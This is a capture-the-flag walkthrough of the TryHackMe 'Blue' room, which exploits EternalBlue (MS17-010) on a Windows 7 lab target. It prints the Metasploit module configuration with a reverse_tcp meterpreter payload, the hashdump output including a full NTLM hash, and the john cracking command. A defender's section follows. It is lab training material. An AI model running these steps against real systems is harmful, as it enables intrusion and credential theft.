
# Blue  TryHackMe



![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)

![OS](https://img.shields.io/badge/OS-Windows%207-blue)

![Tags](https://img.shields.io/badge/Tags-EternalBlue%20%7C%20SMB%20%7C%20Metasploit-red)



> Deploy & hack into a Windows machine, leveraging common misconfigurations issues.



**Room:** https://tryhackme.com/room/blue

**Completed:** 19 May 2026



---



## Summary



A Windows 7 machine vulnerable to **MS17-010 (EternalBlue)**  a remote code execution flaw in SMBv1 disclosed in 2017 and famously used in the WannaCry ransomware attack. The exploit gives `NT AUTHORITY\SYSTEM` access without credentials.



## Tools Used



- `nmap`  port scanning & vulnerability detection

- `metasploit`  exploitation & post-exploitation

- `john the ripper`  NTLM hash cracking

- `meterpreter`  interactive Windows access



---



## 1. Reconnaissance



### Port Scan



```bash

nmap -sV -sC -Pn <target-ip>

```



Top open ports identified:

- `135/tcp`  msrpc

- `139/tcp`  netbios-ssn

- `445/tcp`  microsoft-ds (SMB)

- `3389/tcp`  ms-wbt-server (RDP)



### Vulnerability Scan



```bash

nmap -Pn -p 445 --script vuln <target-ip>

```



Result:
mb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
The target is vulnerable to **MS17-010 / EternalBlue**.



---



## 2. Exploitation



### Load EternalBlue in Metasploit
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue



### Configure & Run

### Configure & Run

set RHOSTS <target-ip>
set LHOST <attacker-ip>
set payload windows/x64/meterpreter/reverse_tcp
exploit


Result:
[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] =-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=
[*] Meterpreter session opened
meterpreter >

---

## 3. Post-Exploitation

### Confirm Privileges
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

System-level access achieved  highest privilege on Windows.

### System Information
meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x64
Domain          : WORKGROUP

### Dump Password Hashes
meterpreter > hashdump
Administrator:500:aad3b435...:31d6cfe0...:::
Guest:501:aad3b435...:31d6cfe0...:::
Jon:1000:aad3b435...:ffb43f0de35be4d9917ac0cc8ad57f8d:::

Jon's NTLM hash captured: `ffb43f0de35be4d9917ac0cc8ad57f8d`

### Crack the Hash with John

```bash
echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > jon.hash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon.hash
```

Password cracked from `rockyou.txt` wordlist.

### Flag Locations
meterpreter > search -f flag*.txt

Flags found at:
- `C:\flag1.txt`  system root
- `C:\Windows\System32\config\flag2.txt`  SAM database location
- `C:\Users\Jon\Documents\flag3.txt`  user documents

---

## 4. Lessons Learned

- **MS17-010 is still everywhere** in unpatched legacy Windows systems
- **SYSTEM-level RCE on first hit** is the worst-case scenario for defenders  no auth required
- **Hash dumping** is trivial once you have SYSTEM
- **`rockyou.txt` cracks weak passwords in seconds**  strong password policies matter

## 5. Defender's Perspective

How to prevent this:

1. **Patch MS17-010** (KB4013389)  released March 2017
2. **Disable SMBv1** entirely on modern systems
3. **Network segmentation**  SMB should never be exposed to untrusted networks
4. **EDR/AV** with behavioral detection for hash dumping & Metasploit signatures
5. **Strong password policy** to slow down post-compromise attacks
6. **Principle of least privilege**  don't let users run as Administrator

---

## References

- [MS17-010 Bulletin](https://technet.microsoft.com/en-us/library/security/ms17-010.aspx)
- [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
- [WannaCry analysis](https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/)
